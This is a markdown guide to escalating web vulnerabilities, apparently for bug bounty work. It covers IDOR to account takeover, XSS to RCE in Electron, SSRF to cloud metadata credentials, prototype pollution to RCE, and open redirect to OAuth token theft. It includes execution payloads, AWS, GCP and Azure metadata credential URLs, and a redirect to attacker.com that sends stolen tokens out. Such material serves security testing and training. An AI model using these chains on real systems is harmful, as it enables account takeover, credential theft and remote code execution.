# Vulnerability Escalation Guide

This guide outlines common escalation chains to maximize the impact of vulnerabilities discovered during JavaScript code analysis.

## 1. IDOR to Account Takeover (ATO)

**Description:** Escalating an Insecure Direct Object Reference (IDOR) in a sensitive endpoint to gain full control over another user's account.

### Escalation Steps:
1. **Identify IDOR:** Find an endpoint that allows modifying user data (e.g., `PUT /api/v1/user/profile`).
2. **Test for IDOR:** Change the `user_id` or `email` in the request to a target user's ID.
3. **Escalate to ATO:**
    - Change the target user's email address to one you control.
    - Trigger a "Forgot Password" flow.
    - Receive the reset link on your controlled email.
    - Reset the password and log in as the target user.

### Impact Multiplier:
- **Initial:** Medium (Data Leakage/Modification)
- **Escalated:** Critical (Full Account Takeover)

---

## 2. XSS to Remote Code Execution (RCE)

**Description:** Using Cross-Site Scripting (XSS) in a desktop application (Electron) or a server-side rendering (SSR) context to achieve RCE.

### Escalation Steps (Electron Example):
1. **Identify XSS:** Find an injection point in the application UI.
2. **Check Context:** Determine if `nodeIntegration` is enabled or if a `preload` script exposes dangerous APIs.
3. **Payload:**
   ```javascript
   <script>
     require('child_process').exec('calc'); // Simple RCE test
   </script>
   ```
4. **Advanced (React2Shell - CVE-2025-66478):** Leverage specific React hydration vulnerabilities to execute code in the context of the server or client.

### Impact Multiplier:
- **Initial:** Medium/High (Session Hijacking)
- **Escalated:** Critical (Full System Compromise)

---

## 3. SSRF to Cloud Metadata Access

**Description:** Escalating Server-Side Request Forgery (SSRF) to extract sensitive credentials from cloud infrastructure metadata services.

### Escalation Steps:
1. **Identify SSRF:** Find a parameter that fetches external resources (e.g., `?url=http://example.com`).
2. **Target Metadata Service:**
    - **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
    - **GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (Requires `Metadata-Flavor: Google` header)
    - **Azure:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
3. **Extract Credentials:** Use the returned JSON to obtain AccessKeyId, SecretAccessKey, and Token.

### Impact Multiplier:
- **Initial:** Medium (Internal Port Scanning)
- **Escalated:** Critical (Cloud Infrastructure Access)

---

## 4. Prototype Pollution to RCE

**Description:** Exploiting Prototype Pollution to overwrite global object properties that are later used in dangerous functions like `eval`, `child_process.exec`, or template engines.

### Escalation Steps:
1. **Identify Prototype Pollution:** Find an object merge/clone operation vulnerable to `__proto__` injection.
2. **Find a Gadget:** Identify a library or internal code that uses a property from the prototype in a dangerous way.
3. **Payload (Lodash/Handlebars Example):**
   ```javascript
   // Pollute the prototype
   Object.prototype.shell = "node -e 'require(\"child_process\").execSync(\"touch /tmp/pwned\")'";
   // Trigger the gadget (e.g., a template engine that uses 'shell' property)
   ```
4. **Execute:** The polluted property is used by the application logic to execute arbitrary commands.

### Impact Multiplier:
- **Initial:** Medium (Denial of Service)
- **Escalated:** Critical (Remote Code Execution)

---

## 5. Open Redirect to OAuth Token Hijacking

**Description:** Using an Open Redirect vulnerability to steal OAuth 2.0 authorization codes or access tokens.

### Escalation Steps:
1. **Identify Open Redirect:** Find a parameter that redirects users (e.g., `?next=/dashboard`).
2. **Identify OAuth Flow:** Find an OAuth authorization endpoint (e.g., `/oauth/authorize`).
3. **Chain the Vulnerability:**
    - Craft a URL where the `redirect_uri` points to a legitimate but vulnerable endpoint with an Open Redirect.
    - `https://auth.example.com/authorize?client_id=123&redirect_uri=https://app.example.com/callback?next=https://attacker.com`
4. **Steal Token:** When the user authorizes, the code/token is sent to `app.example.com`, which then redirects it to `attacker.com` via the Open Redirect.

### Impact Multiplier:
- **Initial:** Low (Phishing)
- **Escalated:** High/Critical (Account Access via OAuth)
